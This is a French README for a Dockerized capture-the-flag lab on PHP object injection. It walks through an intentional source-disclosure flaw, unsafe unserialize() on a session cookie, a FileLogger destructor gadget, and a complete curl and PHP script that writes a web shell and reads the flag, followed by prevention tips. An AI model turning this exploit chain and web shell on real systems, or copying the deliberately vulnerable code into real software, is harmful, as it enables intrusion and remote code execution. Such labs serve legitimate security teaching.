# CTF-5: PHP Object Injection

## Objectif

Ce laboratoire teste les vulnérabilités liées à la désérialisation d'objets PHP. L'application contient une **vulnérabilité intentionnelle LFI** qui permet de découvrir le code source, révélant une **vulnérabilité de désérialisation** exploitable pour obtenir une RCE.

## Architecture

- **web**: Service Apache + PHP 8.1 avec gestion de sessions via cookies encodés en Base64
  - Contient le fichier `/flag.txt` accessible une fois la RCE obtenue

## Fichiers

- `index.php`: Portail de session principal avec LFI intentionnelle via le paramètre `?source=`
- `classes.php`: Définition des classes `UserSession` et `FileLogger`
- `Dockerfile`: Configuration PHP 8.1-Apache avec permissions appropriées
- `docker-compose.yml`: Orchestration multi-conteneur

## Vulnérabilité - Étapes de la découverte

### 1️⃣ LFI Intentionnelle (Piste)
L'application expose un paramètre `?source=` qui permet de lire le code source en Base64 :

```bash
curl 'http://localhost:8005/index.php?source=classes'
curl 'http://localhost:8005/index.php?source=index'
```

Un **indice HTML** guide aussi le participant :
```html
<!-- DEBUG_MODE_ACTIVE -->
💡 Hint: Systèmes de débogage actifs. Essayez ?source=classes ou ?source=index pour inspecter le code.
```

### 2️⃣ Désérialisation Non Sécurisée
Dans `index.php`, le code utilise `unserialize()` sur le cookie sans validation :

```php
$decoded_data = base64_decode($_COOKIE['session_data'], true);
$session = unserialize($decoded_data);  // ⚠️ Vulnérable !
```

### 3️⃣ Gadget Chain
La classe `FileLogger` contient une méthode `__destruct()` qui écrit dans un fichier :

```php
class FileLogger
{
    public $logFile;
    public $message;

    public function __destruct()
    {
        if ($this->logFile !== null && $this->message !== null) {
            file_put_contents($this->logFile, $this->message . "\n", FILE_APPEND);
        }
    }
}
```

Combination : Créer un objet malveillant → le sérialiser → l'injecter via le cookie → exploitation au `__destruct()`.

## Démarrage

```bash
docker-compose up --build
```

L'application est accessible sur `http://localhost:8005`

## Exploitation rapide

```bash
# 1. Découvrir la piste (indice HTML visible après 3 sec)
curl -s http://localhost:8005/ | grep -i "hint\|debug"

# 2. Extraire le code source
curl -s 'http://localhost:8005/index.php?source=classes'

# 3. Générer le payload
PAYLOAD=$(docker exec ctf5-php-injection php -r '
class FileLogger {
    public $logFile;
    public $message;
    public function __construct($f, $m) {
        $this->logFile = $f;
        $this->message = $m;
    }
}
$obj = new FileLogger("/var/www/html/shell.php", "<?php system(\$_GET[\"cmd\"]); ?>");
echo base64_encode(serialize($obj));
')

# 4. Injecter le payload
curl 'http://localhost:8005/index.php' -H "Cookie: session_data=$PAYLOAD"

# 5. Obtenir la RCE et récupérer le flag
curl 'http://localhost:8005/shell.php?cmd=cat%20/flag.txt'
```

## Guides détaillés

- **WALKTHROUGH.md** : Processus complet d'exploitation étape par étape
- **EXPLOIT_GUIDE.md** : Guide rapide sans accès Docker

## Prévention

- ✅ Jamais utiliser `unserialize()` sur données non fiables
- ✅ Utiliser `json_encode()`/`json_decode()` à la place
- ✅ Désactiver les fonctionnalités de débogage en production
- ✅ Implémenter une whitelist stricte de classes sérialisables
- ✅ Monitorer les opérations de fichiers suspects
- ✅ Utiliser une WAF (Web Application Firewall)
